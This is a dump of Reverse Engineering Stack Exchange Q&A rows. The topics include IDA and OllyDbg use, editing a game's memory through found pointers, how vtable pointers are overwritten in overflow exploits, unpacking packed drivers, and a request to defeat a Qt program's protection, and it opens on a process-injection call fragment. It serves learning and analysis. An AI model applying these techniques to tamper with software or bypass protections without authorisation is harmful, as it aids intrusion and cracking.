CreateRemoteThread(handle, NULL, 0, targetAddr, NULL, 0, &amp;threadId);
</code></pre>
","3485"
"What is the meaning of *(_DWORD *)","2799","","<p>I disassemble some code using IDA Pro and get the pseudo-code. It showed something like below.</p>

<pre><code>for ( i = 0; i &lt; 6; ++i )
{
  v7 = (int)&amp;val_253;                         
  for ( k = 1; k &lt; key[i]; ++k )
    v7 = *(_DWORD *)(v7 + 8);
  v4[i] = v7;
}
</code></pre>

<p>I can't understand what is happening in <code>v7 = *(_DWORD *)(v7 + 8);</code> line. After executing this line the value of v7 changes from <code>0xC</code>. I can't understand how it happens. I thought the value should change from <code>0x8</code>.</p>

<p>And I thought <code>*(_DWORD *)</code> should return a value. But instead, it returns another pointer. How is that happened (The both values of the memory, <code>0xc</code> away from <code>&amp;val_253</code> and <code>0x8</code> away from <code>&amp;val_253</code> are zero).</p>
","<pre><code>v7 = *(_DWORD *)(v7 + 8);
</code></pre>

<p>Means :</p>

<pre><code>v7 = *(v7 + 8)
</code></pre>

<p>Or in assembly </p>

<pre><code>MOV v7, DWORD PTR [v7 + 0x8]
</code></pre>

<p>(This is only for understanding purpose, chances are that it's not really like above samples)</p>

<p><code>v7</code> is assigned with the value located at address <code>v7+8*sizeof(DWORD)</code>. For example, if <code>v7 = 0xabcd0123</code> then <code>v7 + 8*sizeof(DWORD)  = 0xabcd0143</code>. Whatever is located at <code>0xabcd0143</code> will be assigned to <code>v7</code>.</p>
","9510"
"Is it possible to find static pointer with disassembler?","2790","","<p>I found an assembler instruction: <code>mov [esi+2F],dl</code>. I think ESI is a reference to a struct or class. <code>0x2F</code> is the offset that references a property of the struct/class. Is it possible to find the value of the ESI register? I think this class or struct is initialized when the game is started.</p>

<p>For example, I tried to reverse GTA San Andreas. A lot of memory addresses of the GTA SA <a href=""http://www.gtamodding.com/?title=Memory_Addresses_%28SA%29"" rel=""nofollow"">here</a>.</p>

<p>I've found such information in this site: 0xB6F5F0 - Player pointer (CPed).</p>

<p>I think it's address that I finding now. But how I can find it with debugger like cheat-engine without pointer scan? I'd like to find addresses in asm code. It's possible?</p>

<p>I tried to set a breakpoint to the instruction. But I think it's useless because ESI address is dynamic. As I understand CPed struct/class uses dynamic memory allocation.</p>

<p>I am sorry for my bad English and thanks in advance.</p>
","<h1>Yes, it is possible</h1>

<p>I'm going to explain you a bit how most games do it (I have never reversed any GTA but I suppose it's something like this anyway).</p>

<p>I'm going to cover static and dynamic allocation of structures.</p>

<hr>

<p><strong>The static way:</strong></p>

<pre><code>GlobalGameInfo g_info;
// ...
g_info.some_data = 1;
</code></pre>

<p>This is what ends up being a static offset in IDA, like so:</p>

<pre><code>lea eax, [g_info + 0xAABB] ; suppose 0xAABB is the offset for 'some_data'
mov [eax], 1;
</code></pre>

<p><code>g_info</code> is always going to stay at the same offset, so once you find it, you can just use <code>g_info + offset</code> to get your data.</p>

<p><strong>The dynamic way:</strong></p>

<pre><code>Player* players; // can be defined as Player* players[&lt;count&gt;] or Player** players;
                 // it's the same
// ...
players = new Player[players_count];
// ...
players[1].alive = false;
</code></pre>

<p>Which then results in:</p>

<pre><code>; this is a static location which is actually the ""players"" variable
; and it contains an address which points to the offset in memory of the
; actual players structure
dword_xxxx dd ?
</code></pre>

<p>So to use it in e.g. Cheat Engine, you <code>Add a new address</code>, check <code>Pointer</code>, add the <code>xxxx</code> part of <code>dword_xxxx</code>, and in offset, put your desired offset.
For example, to get <code>players[1].alive</code>, with <code>alive</code> being on offset e.g. 0x100, you'd calculate:</p>

<pre><code>value_stored_in_dword_xxxx + sizeof(Player) * player_id + 0x100
</code></pre>

<p>So if <code>dword_xxxx</code> -> <code>0xAABBCCDD</code>, <code>sizeof(Player)</code> -> <code>0x204</code>, <code>player_id</code> -> <code>8</code>, and <code>offset</code> -> <code>0x100</code>, your calculation would be:</p>

<pre><code>0xAABBCCDD + (0x204 * 8) + 0x100
// ^base      ^size   ^id  ^offset
</code></pre>

<hr>

<h2>The example</h2>

<p>Since you gave us <code>mov [esi + 0x2F], dl</code>:</p>

<ul>
<li><code>esi</code> is a pointer to the structure. Look above (in the disassembly).

<ul>
<li><code>mov esi, dword ptr [dword_xxxx]</code> (most probably) means it's dereferencing a pointer, which means that the structure is allocated dynamically.</li>
<li><code>mov esi, offset dword_xxxx</code> (most probably) means that it's just assigning the address (<code>xxxx</code> part) to <code>esi</code>, so this is a static address.</li>
</ul></li>
</ul>

<hr>

<h2>The usage</h2>

<p><strong>Cheat Engine</strong></p>

<p>In Cheat Engine, it's easy as inputting the pointer and the offset:</p>

<p><img src=""https://i.stack.imgur.com/gFBPU.png"" alt=""Cheat Engine""></p>

<p>As you can see, <code>0x5CCB138</code> is the <code>dword_xxxx</code>, the value inside <code>dword_xxxx</code> is <code>0x09021A00</code>, and that + <code>0x142</code> (my offset) results in the start of the in-game name.</p>

<p><strong>C</strong></p>

<p>In case you want to do it programmatically, you can do it like this in C:</p>

<pre><code>PCHAR my_name = PCHAR (*PDWORD(0x5CCB138) + 0x142);
^save the addr|       | ^deref to get     | add the offset
              | ^cast |    0x09021A00     |

// -&gt; be careful, do not surpass the max length!
// -&gt; also remember that there's 'your name' length + 1 \x00 byte
//    at the end!
char new_name[] = ""newName"";
strncpy(my_name, new_name, sizeof(new_name)); // again: be careful with the length!
</code></pre>

<p>The proper way, however, would be reversing the entire struct like this:</p>

<pre><code>struct player_data {
    int ID;
    char name[15];
    int some_data;
    ...;
};
// make sure the order / size of each item is correct!
// a single error can fuck up the entire struct

// I'm going to assume you understand pointers
player_data* data = *(player_data**) 0x5CCB138;

// do your changes
// again, be careful with the length!
// also note that sizeof() will not work if you use char*
char new_name[] = ""new name!"";
strncpy(data-&gt;name, new_name, sizeof(new_name));
</code></pre>
","8188"
"Break on returning to a specific module","2783","","<p>I'm debugging an application in OllyDbg, I pause the program at a specific place. Now I am deep inside ntdll and other gui related module calls, judging from the stack. <strong>I'ld like to break as soon as the application returns to any function within a specified (the main) module.</strong> Is there such breakpoint condition? How can I do this? </p>
","<p>Go to the memory window in Ollydbg. Find the code section (usually .text) of the module you want to break on return to. Right click the memory section and set break-on-access or hit <kbd>F2</kbd>. You'll break once execution reaches that memory. You can also change the memory access to read only and you'll get an exception when execution hits that memory segment.</p>

<p>You can also use a trace and set a conditional stop when EIP is within a certain range, to do this simply set the condition by going to Debug, Set Condition (<kbd>Ctrl</kbd>+<kbd>T</kbd>). Then start the trace with Debug, Trace Into (<kbd>Ctrl</kbd>+<kbd>F11</kbd>)or Debug, Trace Over (<kbd>Ctrl</kbd>+<kbd>F12</kbd>). This will enable you to see where you came from, even if the call is indirect.</p>

<p>It's not guaranteed to be on return but if you're in a different module it's fairly likely that the return is when the first execution happens. You could also be triggering on calls through imports, through object vtables or some other mechanism. You'd need to study the state you're in when the break hits.</p>
","3406"
"Good training for IDAPython","2776","","<p>I'm familiar with python and IDA in general.  I found a few very basic tutorials but nothing that goes through an explanation of the classes used and the full capability set.  Near as I can tell the documentation consists of a list of functions.  The IDAPro book just recommends learning it through banging your head against a wall.  </p>

<p>Anyone have a better suggestion?</p>
","<p>I wrote <a href=""https://github.com/tmr232/Sark"">Sark</a> to avoid this banging-head-against-wall routine. It provides wrappers around most of the commonly-used IDAPython APIs, making them more pythonic.<br>
You can find the documentation for Sark <a href=""http://sark.readthedocs.org/"">here on Read-The-Docs</a>.</p>

<p>As mentioned before by @CrazyFrog, you can use:</p>

<ol>
<li>Alexander Hanel's <a href=""https://leanpub.com/IDAPython-Book"">book</a> and <a href=""http://hooked-on-mnemonics.blogspot.com/"">blog</a>;</li>
<li>Ero Carrera's <a href=""http://www.openrce.org/articles/full_view/11"">Intro to IDAPyton</a>;</li>
</ol>

<p>Additionally, there are official Hex-Rays sources:</p>

<ol>
<li><a href=""https://github.com/idapython/src/tree/master/examples"">IDAPython Examples</a>, which is filled with useful snippets;</li>
<li><a href=""https://www.hex-rays.com/products/ida/support/idapython_docs/"">IDAPython Docs</a>, which are not too useful;</li>
<li>The IDA SDK headers (or the <a href=""https://www.hex-rays.com/products/ida/support/sdkdoc/"">SDK Docs</a>). This is a really useful source of information, as <code>grep</code>ing through it will usually get you the function you were looking for.</li>
<li><a href=""http://www.hexblog.com/"">Hex-Blog</a> - The Hex-Rays blog. Contains some neat tricks along with tutorials on new APIs.</li>
</ol>
","11394"
"How to find the location of the vtable?","2762","","<p>Actually, I am trying to learn a little about vtable overflows. So, my learning documents state the following: </p>

<blockquote>
  <p>The main point to realize is that whenever we declare a C++  class
  with virtual methods, the pool of memory where it exists (the heap,
  the stack, etc.) now contains a pointer to a function pointer table
  which will eventually be used to call the function. In the event of an
  overflow, we can overwrite this pointer value so that our code will be
  called the next time a virtual method is called.</p>
</blockquote>

<p>So, my question is, how do I find the location of the vtable pointer ? </p>

<p>I mean, do I have to search through PEB like when I am trying to find the base address from some modules. Or, is this specific for each situation ?</p>
","<p>This is compiler dependent - the compiler may place the vtable wherever it wants to, as long as it does it consistently. However, in most cases, the vtable pointer is the first element (at offset 0) of the generated structure.</p>

<pre><code>class test {
    int a;
    int b;
    test()          { ...; }
    ~test()         { ...; }
    void somefunc() { ...; }
    int c;
}
</code></pre>

<p>would use this memory layout for the class:</p>

<pre><code>+----------------+               +--------------+
|  vtable        | ------------&gt; | test         |
+----------------+               +--------------+
|  a             |               | ~test        |
+----------------+               +--------------+
|  b             |               | somefunc     |
+----------------+               +--------------+
|  c             |
+----------------+
</code></pre>

<p>so (assuming pointers and integers are all 4 bytes), the vtable is at offset 0, a at 4, b at 8 and c at 12.</p>

<p>Note that not all compilers use this convention. For example, the Watcom C++ 386 compiler didn't use a vtable at all, but mixed the function pointers with data. (I know this case because i once disassembled a game that was compiled with Watcom 20 years ago. Not that i expect you to ever see this kind of layout in a modern compiler, just to provide an example that it can be different):</p>

<pre><code>+----------------+
|  test          |
+----------------+
|  ~test         |
+----------------+
|  a             |
+----------------+
|  b             |
+----------------+
|  somefunc      |
+----------------+
|  c             |
+----------------+
</code></pre>

<p>The entries at offset 0 and 4 (again, assuming 4 byte integers/pointers) are the parameterless constructor and destructor function of the class, the rest is a mix of variables and methods in the order they appear in the class definition. Of course, this is horribly inefficient, because the compiler has to initialize every class method whenever an object is instantiated, instead of just setting one pointer to the vtable.</p>

<p>TL;DR: In most cases, the vtable pointer is the first element of the class structure, but you really need to know which compiler was used and which conventions this compiler has.</p>

<p>Another thing - you talk about a ""vtable overflow"" in your original post. Your ""normal"" exploit doesn't overflow a vtable; the vtables are pre-initialized when your program starts, and (normally) never ever change. To write an exploit, you would either:</p>

<ol>
<li>use a buffer overflow to modify a function pointer in a vtable, so the next time the class method gets called, your code is executed instead</li>
<li>use a buffer overflow to modify the vtable pointer of a class instance, so the next time this class instance executes a method, your vtable is used instead of the other one.</li>
</ol>

<p>As vtables normally don't change, and may even be placed in a read-only memory segment by the compiler, your normal exploit ignores 1. and uses 2.</p>
","5957"
"How to trace every instruction that was executed?","2760","","<p>When I use ""trace into"" it doesn't log every single executed instruction in the ""Run Trace"" window only some of them. I have to set breakpoints in order for some of the instructions to be logged. </p>

<p>For example right now I'm tracing a program with a TLS callback. I break on system entry point, so I start in ntdll and hit ""trace into"" but the TLS callback which is from the main executable is not logged if I don't put a breakpoint on it. If I put a breakpoint on it then it appears in the run trace. How can I log every single instruction without setting breakpoints? </p>

<p>I have unchecked the box for ""Don't enter system dlls"" and checked the box for ""always trace over string functions"" (and all other combinations thereof). </p>

<p>I have also tried setting a trace condition ""pause trace when EIP is between 400000-500000"" which only works when I set a breakpoint on the TLS (i.e clicking ""trace into"" will single-step through the TLS code once the breakpoint is hit and will not pause not before the breakpoint I set), and doesn't work if I don't set the breakpoint. There is obviously something I'm missing, but I've tried everything that I can think of. </p>

<p>Also another thing: When I press ""Execute till user code"" from ntdll, it doesn't stop on the TLS callbacks (unless I put breakpoints on there). Why does that happen? </p>

<p>UPDATE: Turns out problem was I was using 64 bit OS. I ran it again in 32 bit windows and the TLS was traced fine. </p>

<p>""Execute till user code"" still doesn't break on TLS callbacks though. </p>
","<p>how did you confirm that the tls call back is not present in run trace ? </p>

<p>AFAIK ollydbg properly traces through LdrpCallInitRoutine    </p>

<pre><code>Run trace, selected line
 Back=1663410.
 Thread=Main
 Module=ntdll
 Address=7C91C4F5
 Command=CALL    ntdll.LdrpCallInitRoutine
 Comment=ELdrpCallInitRoutine &lt;------------
</code></pre>

<p>do you log the trace to some file the buffer entries drop out in last in first out fashion (buffer size is configurable and default size of buffer is set at its lowest size )</p>

<p>even if you configure the buffer to its maximun size there is a chance that the log entries were dropped </p>

<p>do you know the address of tls callback </p>

<p>if yes did you try right click -> mark address and using + / - to navigate ?</p>

<p>here is a tls entry as logged by ollydbg </p>

<pre><code>Run trace, selected line
 Back=1663399.  &lt;------------------ i have paused the binary so much instruction forward     
notice the earlier index is farther back in ldrpcallinitroutine paste above
 Thread=Main
 Module=kernl
 Address=10001000 &lt;ModuleEntryPoint&gt;  &lt;---- a dll (LDR_PROCESS_ATTACH Init Call)
</code></pre>

<p>Command=PUSH    EBP</p>
","10636"
"In IDA how can I define a data address as a struct and array of datatype","2729","","<p>As the title says im a bit lost on how to get something in the data section to be recognized as a struct or an array of structs or an array of strings etc.</p>

<p>Cheers</p>
","<p>Struct: <kbd>Alt</kbd>+<kbd>Q</kbd></p>

<p>Array: Numeric keypad <kbd>*</kbd></p>
","3082"
"extracting data from binary file","2727","","<p>I have a binary file and a text file of the corresponding data, and I know the location in the binary file where the data are contained. However, I am unable to determine in what manner the data are encoded. The data do not appear to be stored as float16, float32, float64, signed/unsigned int of various length, or char, based on analysis of the hexdump. Perhaps the section containing the data has been compressed by some algorithm, or perhaps the numbers are stored in a representation with which I am unfamiliar.</p>

<p>The human-readable data are as follows:</p>

<pre><code>20.0,0.001
21.0,0.001
22.0,0.001
23.0,0.001
24.0,0.002
25.0,0.002
26.1,0.002
27.0,0.004
28.0,0.002
29.0,0.002
30.0,0.003
31.0,0.004
(etc)
</code></pre>

<p>I have 70 such lines, each containing two numbers of the precision shown in the table. The corresponding data section comprises 2312 hexadecimal digits, or 1156 bytes. There is a repeating pattern of characters ascending the ASCII table followed by @ signs (e.g., 4@ = '0x3440', 5@ = '0x3540', 6@ ='3640', etc.). This ""motif"" occurs every 16 bytes and there are 70 occurrences. One challenge is that although there is a monotonic progression in the ASCII value of the byte preceding the @ ('0x40'), it does not always increase (i.e., there are stationary points, sometimes followed by a jump that skips over one of the ASCII characters; for instance <code>4@ ... 5@ ... 6@ ...6@ ... 8@ ... 9@ ...</code>). Based on the 16-byte periodicity of this motif, I assume each row in the human-readable table is represented in the binary file by 16 consecutive bytes. Thus, the total size of the binary data table would be 16*70 = 1120 bytes. The complete data table is 1156 bytes, so I further assume the unexplained 36 bytes contain header information. Indeed, I can account for most of the header: 15 bytes containing a data descriptor in plain text, 16 bytes of zeros which appears to serve as an offset, and one byte ('0x46' = 70 in decimal) which appears to encode the number of lines in the table.</p>

<p>My problems are currently the following:</p>

<ul>
<li>I do not know the ""phase"" of the 16 bytes of data (i.e., where one 16 byte segment ends and the next begins)</li>
<li>I do not know how the human-readable numbers are encoded. They do not appear to be encoded in various float or integer representations, nor as ASCII characters.</li>
<li>I do not know whether the data are compressed and if so how to determine the method of compression. If they are compressed, then the compression would be restricted to the data table itself since I can find plain text elsewhere in the binary file by running <code>strings</code> on it. Running <code>file</code> on the binary file simply reports that it contains ""data"".</li>
</ul>

<p>An example of the hexadecimal contents (<code>xxd</code> dump) corresponding very nearly to the contents above and aligned to show the progression of '0x40' = @ that I mentioned previously is shown below. This table begins with the '0x46' (decimal 70), to which I alluded previously as being a part of the header and representing the number of lines in the data table. The hex digits before the colon simply give the offset of the line from the beginning of the file; the middle section shows eight bytes (16 hex digits) of data; the right part of the table shows the ASCII-printable values for the hex data (<code>.</code> signifies ASCII-unprintable values, mostly <code>0x00</code>).</p>

<pre><code>00000180: 4600 0000 0000 0000 0000 3440 0000 0000  F.........4@....
00000190: 0000 583f 0000 0000 0000 3540 0000 0000  ..X?......5@....
000001a0: 0000 503f c3f5 285c 8f02 3640 0000 0000  ..P?..(\..6@....
000001b0: 0000 553f 3e0a d7a3 70fd 3640 0000 0000  ..U?&gt;...p.6@....
000001c0: 0000 453f 0000 0000 0000 3840 0000 0000  ..E?......8@....
000001d0: 0040 5d3f 85eb 51b8 1e05 3940 0000 0000  .@]?..Q...9@....
000001e0: 0000 5e3f cdcc cccc cc0c 3a40 0000 0000  ..^?......:@....
000001f0: 0000 633f f628 5c8f c2f5 3a40 0000 0000  ..c?.(\...:@....
00000200: 00c0 703f 3e0a d7a3 70fd 3b40 0000 0000  ..p?&gt;...p.;@....
00000210: 0000 5a3f 0000 0000 0000 3d40 0000 0000  ..Z?......=@....
00000220: 0020 613f 48e1 7a14 ae07 3e40 0000 0000  . a?H.z...&gt;@....
00000230: 00c0 643f c3f5 285c 8f02 3f40 0000 0000  ..d?..(\..?@....
</code></pre>

<p>I would like advice on how to proceed with this particular problem, mainly determining whether compression is a factor and how the numbers are represented in the binary file, since I can thus far detect no obvious correspondence between the rows of human-readable data and the repeating 16-byte motifs that I described.</p>
","<p>This data actually is in standard x86 double (8 byte) representation, with the first 4 byte something else (46 00 00 00 probably being 70 as you said) and the data starting at offset 0x184 in the binary file.</p>

<p>What probably confused you is the fact that the human-readable data is rounded, and the binary file has a better precision. So, for example, your <code>23.0</code> is actually <code>22.99</code>, which is why <code>3640</code> occurs twice, and the next value, <code>24.00</code>, has <code>38 40</code>.</p>

<p>When I convert your hex back to binary (edit out the offset and character dump, then <code>xxd -r -p &lt; x.hex &gt; x.bin</code>), then run the following perl program over it:</p>

<pre><code>open(F, ""&lt;$ARGV[0]"");
binmode F;

seek(F, 4, 0);

while (read(F, $dbl, 8)) {
    read(F, $dbl2, 8);
    printf(""%15.10f  %15.10f   "", unpack(""d"", $dbl), unpack(""d"", $dbl2));
    printf(""%4.1f  %5.3f\n"", unpack(""d"", $dbl), unpack(""d"", $dbl2));
}
</code></pre>

<p>I get this:</p>

<pre><code>20.0000000000     0.0014648438   20.0  0.001
21.0000000000     0.0009765625   21.0  0.001
22.0100000000     0.0012817383   22.0  0.001
22.9900000000     0.0006408691   23.0  0.001
24.0000000000     0.0017852783   24.0  0.002
25.0200000000     0.0018310547   25.0  0.002
26.0500000000     0.0023193359   26.1  0.002
26.9600000000     0.0040893555   27.0  0.004
27.9900000000     0.0015869141   28.0  0.002
29.0000000000     0.0020904541   29.0  0.002
30.0300000000     0.0025329590   30.0  0.003
31.0100000000     0.0000000000   31.0  0.000
</code></pre>

<p>As you see, the right 2 columns are the numbers in your precision and match (except the last 0.004 which isn't in your file), while the first 2 columns are in high precision and, sometimes, have a value that is slightly less than the next integer.</p>

<p>I found this by converting 20.0 to double and checking the hex:</p>

<pre><code>perl -e ""print pack('d', 20.0);"" | xxd
0000000: 0000 0000 0000 3440                      ......4@
</code></pre>

<p>then just starting at the fitting offset in your file and converting stuff back.</p>
","13892"
"IDA Pro: How to export data to C style array?","2707","","<p>While disassembling a malware binary, I came across several arrays of shorts. The size of each array is 1024 members. I would like to export them to C style arrays, as:</p>

<pre><code>short array1[1024] = { 2, 5, 8, ... , 4};  /* This is just an example */
</code></pre>

<p>I could definitely do <em>Copy/Paste</em> and edit the whole thing by hand. However, it seems to be pretty tedious. I wonder, is there a better approach to achieve it? Could it be done with script/plugin? </p>
","<p>A small script will do the trick.  In IDC, something like:  </p>

<pre><code>auto ea, len, i;
len = 1024;
ea = /* whatever */;

Message(""short array[1024] = {\n  "");
for(i = 0; i &lt; len; i = i + 1)
{
  Message(""0x%.04lx"", Word(ea+i*2));
  if( i != (len - 1) )
    Message("","");

  if(i &gt; 0 &amp;&amp; (i % 0x1f) == 0)
    Message(""\n  "");
}
Message(""};\n\n"");
</code></pre>

<p><br> </p>

<pre><code>To Handle Bytes instead of Words
Replace 
`Word(...)` with `Byte(...)` 
and
`0x%.04lx` with `0x%.02lx`
and
 Word(ea+i*2) with Byte(ea+i)
</code></pre>

<p><br></p>

<pre><code>To Handle DWORDs instead of WORDs
Replace 
`Word(...)` with `DWord(...)` 
and
`0x%.04lx` with `0x%.08lx`
and
 Word(ea+i*2) with DWord(ea+i*4)
</code></pre>
","2352"
"How to reverse CGI file for MIPS?","2703","","<p>I'm trying to load a CGI file to IDA in order to disassemble it and understand it's behaviour but I can't do it.</p>

<p>According to the strings command I can see some interesting words like system, sprintf, etc. And I know it's a MIPS file, But I'm not able to get something comprehensible in IDA.</p>

<p>Could anyone guide me to achieve this?
Regards. </p>
","<p>Expanding on my comment:</p>

<p>The Freeware IDA Pro doesn't support MIPS, so you won't be able to use it. If you can't use the paid versions of IDA, there are <a href=""https://reverseengineering.stackexchange.com/questions/1817/is-there-any-disassembler-second-to-ida"">free alternatives</a>.</p>

<p>As an example, using <code>radare2</code> as an example, on the Debian MIPS <code>binutils</code> port:</p>

<pre><code>$ file bin/objdump 
bin/objdump: ELF 32-bit MSB  executable, MIPS, MIPS-II version 1 (SYSV), 
dynamically linked (uses shared libs), for GNU/Linux 2.6.26,
BuildID[sha1]=d1d228509874377d7339cfd5b2f15db020e53b7b, stripped
</code></pre>

<p>Following <a href=""http://radare.org/y/?p=examples&amp;f=graph"" rel=""nofollow noreferrer"">this example</a>, we get something like this:</p>

<pre><code>[0x00403300]&gt; af@sym.main
[0x00403300]&gt; ag &gt; foo.dot
foo.dot created
[0x00403300]&gt; !dot -Tpdf -o foo.pdf foo.dot
[0x00403300]&gt; !open foo.pdf
</code></pre>

<p><img src=""https://i.stack.imgur.com/f0Goi.png"" alt=""Part of the graph""></p>

<p>Note that the PDF this churns out is enormous, so you might want to just use <code>pdf</code> instead of <code>ag</code> produce textual output rather than <code>dot</code> files.</p>
","2588"
"How do I move from RCE being a hobby to RCE being a profession?","2698","","<p>I'm currently a high school sophomore. I haven't really done much on the RCE of malware, I've unpacked <code>zbot</code> and <code>rbot</code>, and looked at how they work, but I can manipulate practically any game to my liking by reverse engineering it and finding out which functions I need to detour, or what addresses of code I need to patch. </p>

<p>From what I've read on the <a href=""http://www.reddit.com/r/ReverseEngineering/"">/r/ReverseEngineering</a>, I should create a blog, but what do what do I write on the blog? Do I just detail how I hacked the game? Or must it be purely reversing of malware?</p>
","<p>Someone who does RCE as a hobby and has gathered a lot of experience and hones his/her skills with it can arguably be more experienced than someone doing it for a living but only occasionally.</p>

<p>Simply put: to make it a profession (i.e. what you do for a living), take up a job which requires (and subsequently fosters) your RCE expertise.</p>

<p>And no, by no means do you have to reverse engineer malware in order to be considered a reverse engineer. For all practical purposes in the scope of this site even people reverse engineering household electronics or other consumer goods are just that: reverse engineers. Malware is but one field of expertise within the niche subject of RCE.</p>

<p>And there are loads of fields within RCE. Heck, have a look on <a href=""https://reverseengineering.meta.stackexchange.com/"">meta.RE.SE</a> to see what some want to be within the scope of this site and others don't (and participate, please!). Given that by comparison the RCE community is a relatively small one, I don't think anyone will look down on you for being a beginner or specializing in this or that. Instead, I reckon, you'll be welcomed and the only expectation is the willingness, ability and - yes - <strong>eagerness</strong> to learn.</p>

<p>There is no clear line between the amateur and the professional, which I gather is what your question is all about. Except if you consider that someone makes a living from his reverse engineering skills as that line. But I think anyone with a high enough experience/skill level has to be considered a professional based on that experience/skill - not based on how s/he makes his/her living.</p>

<p><strong>And no, you don't <em>need</em> a blog.</strong> But don't let that keep you from creating one. A blog, especially if you are a student, can be a good reference for potential future employers. So if you choose a more serious nickname than I chose here on SE, if you keep the topics and language in your blog posts professional and refrain from leet-speak, you will not only gather followers within the RCE community, you'll also show what you are capable of. And that last part is what sets the professional seasoned reverse engineer apart from the amateur or beginner: <strong>experience, loads and loads of experience.</strong>
Communities such as this one, <a href=""http://www.openrce.org"" rel=""nofollow noreferrer"">OpenRCE</a>, <a href=""http://www.kernelmode.info/forum/"" rel=""nofollow noreferrer"">kernelmode.info</a>, <a href=""http://www.woodmann.com"" rel=""nofollow noreferrer"">Woodmann</a> will give you a wealth of information. Crackmes and Reversemes can provide a playful incentive to improve your knowledge/skills/expertise and your blog is the shop window out into the world through which <em>you</em> show what you can offer.</p>

<p>Hint: advertise your blog on your profile here and make sure to answer and/or ask questions so that people click your profile. This should get your blog a following that knows the subject matter and will be able to comment and otherwise interact with you.</p>

<hr>

<p>Since I work in the anti-X industry, currently AV, I thought I should perhaps add a few remarks concerning that particular field, since you mentioned the reverse engineering of <a href=""/questions/tagged/malware"" class=""post-tag"" title=""show questions tagged &#39;malware&#39;"" rel=""tag"">malware</a> in your question.</p>

<h2>If you want to work in the anti-X industry</h2>

<p><a href=""https://reverseengineering.stackexchange.com/a/1814/245"">Rolf already pointed you</a> to: <a href=""https://reverseengineering.stackexchange.com/questions/206/where-can-i-as-an-individual-get-malware-samples-to-analyze"">Where can I, as an individual, get malware samples to analyze?</a> So I'll leave it at excellent question, excellent answers for that one. Here follow my remarks</p>

<h3>A career in AV</h3>

<ul>
<li>most AV companies will not hire anyone who <em>wrote</em> malware. Some, as far as I know, did in the past. However, this only fosters the urban myth that we're writing the malware ourselves. I can tell you that we really don't have to - the commercialized malware <em>industry</em>, yes <em>industry</em>, does a pretty good job at it and we try hard to keep up. However, there is truth in that urban myth in that one of the - if not <em>the</em> - first AV vendor (I want give names!) offered bounties for new malware. Well what's the easiest way of getting a bounty if the few available samples are all <em>known</em>? Uh huh, writing your own and submitting it to cash the bounty ...

<ul>
<li>some companies will ""tone it down"" to"" <em>we will not hire anyone who wrote malware and is stupid enough to admit it - if s/he wrote one and we find out, we'll fire that person on the spot.</em></li>
</ul></li>
<li>analyzing malware requires some specializations that you won't have in other RCE topics. If you specialize in kernel mode malware, you are fairly specialized but there will be demand for people with these skills. Still most of the generic methodologies in RCE are applicable for malware - after all reversing malware is a subset of RCE as a whole.</li>
<li>some analysts in AV labs won't have the expertise and skills to work with <a href=""/questions/tagged/disassembly"" class=""post-tag"" title=""show questions tagged &#39;disassembly&#39;"" rel=""tag"">disassembly</a>, for example. Some know a few basics, for some that all stopped back in DOS times (i.e. they will be able to use good ol' <code>debug</code> on a <code>.com</code> file and that's it) and others will specialize in malicious scripts and not need that skill set at all. Also many malware families these days can be identified by traits that don't require going into the nitty gritty.</li>
</ul>

<h3>Literature I find/found useful before and during my career</h3>

<ul>
<li>The Rootkit Arsenal</li>
<li>Practical Malware Analysis: The Hands-On Guide to Dissecting Malicious Software</li>
<li>Malware Analyst's Cookbook and DVD: Tools and Techniques for Fighting Malicious Code</li>
<li>Rootkits: Subverting the Windows Kernel</li>
<li>The IDA Pro Book: The Unofficial Guide to the World's Most Popular Disassembler</li>
<li>Gray Hat Python: Python Programming for Hackers and Reverse Engineers</li>
<li>The Art of Computer Virus Research and Defense (classic, but a bit outdated, still good reading)</li>
</ul>
","1813"
"Hints to reverse engineering a QT software","2686","","<p>I am facing a little bit of problem during reverse a QT application with Ollydbg or IDA.</p>

<p>This software use a protection schema to indetify the number of click made on a QList. After a random amount of click on list rows replace the content of the list with a blank string. That's give me troubles because the protection is dinamic.</p>

<p>Someone of you can point me to some hints to work with QT application or explain me how to identify an event (signal/slot) and work on it please?</p>

<p>Any help will be appreciated, i have searching a lot but there aren't tutorial or documentation about QT reversing...</p>

<p>Thanks</p>
","<p>I would try another approach, without using Olly or IDA, get Cheat Engine, attach it to your software and give X clicks. Search that int value on C.E., and increment while searching too.<br>
Cheat Engine will ""catch"" the variable faster than searching through regular debuggers.
Set the var to 0 and lock it.<br>
Yes, I know C.E. is not a reversing tool, but in this case, and given your RE experience, seems the most fit.
<br>
Or, send the link/.exe and I'm willing to help you.</p>
","8011"
"How can you reliably unpack a Windows driver manually?","2662","","<p>When you unpack manually a Windows user-mode executable, you can easily break at its EntryPoint (or TLS), then trace until you reach the original EntryPoint. However that's not possible with a packed driver.</p>

<p>How can you reliably unpack a Windows driver manually?</p>
","<p>I kind of like your answer about changing the subsystem, especially if you're not a fan of kernel debugging.  I'm a big fan of Windbg, though.  The way I do this is: </p>

<ol>
<li>Hook up my kernel debugger to a VM</li>
<li>Change the first byte of the driver's entry point to be an INT3 (0xCC).</li>
<li>Fix-up the PE checksum (I'm a fan of letting <a href=""https://code.google.com/p/pefile/"">pefile</a> do this work for me).</li>
<li>Load the driver in the VM ( <a href=""http://www.osronline.com/article.cfm?article=157"">OSR</a> has a great driver loader )</li>
</ol>

<p>The kernel should call <code>DriverEntry()</code> on your driver and break into your debugger for you.  Then you can trace the code until you find the OEP as you would have done anyway.  The main advantage I see to this method is that you don't have to fake kernel DLLs or calls that the driver might do during unpacking, and it works on x64.</p>
","1391"
"Any way to fix misinterpreted case jump tables in Ida Pro?","2653","","<p>I'm disassembling a function that seems to use a switch statement, resulting in an indexed indirect jump, in two different places (same function!):</p>

<pre><code>0005FA58                 mov     al, [eax+112h]
0005FA5E                 cmp     al, 4
0005FA60                 ja      loc_5FBED
0005FA66                 and     eax, 0FFh
0005FA6B                 jmp     cs:off_5F98C[eax*4]
0005FA73


00060011                 mov     al, byte ptr unk_A4E30[eax]
00060017                 cmp     al, 3
00060019                 ja      short loc_60053
0006001B                 and     eax, 0FFh
00060020                 jmp     cs:off_5F9A0[eax*4]

0005F98C off_5F98C       dd offset loc_5FBCC, offset loc_5FA73, offset loc_5FAC5, offset loc_5FB14, offset loc_5FB66
0005F98C                                         ; DATA XREF: FunctionStart+BB
0005F9A0 off_5F9A0       dd offset loc_60049, offset loc_6003E, offset loc_60031, offset loc_60028
0005F9A0                                         ; DATA XREF: FunctionStart+670
</code></pre>

<p>The first jump table has 5 entries, the second one 4. Unfortunately, the compiler placed them directly behind each other in memory. This seems to confuse IDA when calculating the graph connections for those nodes:</p>

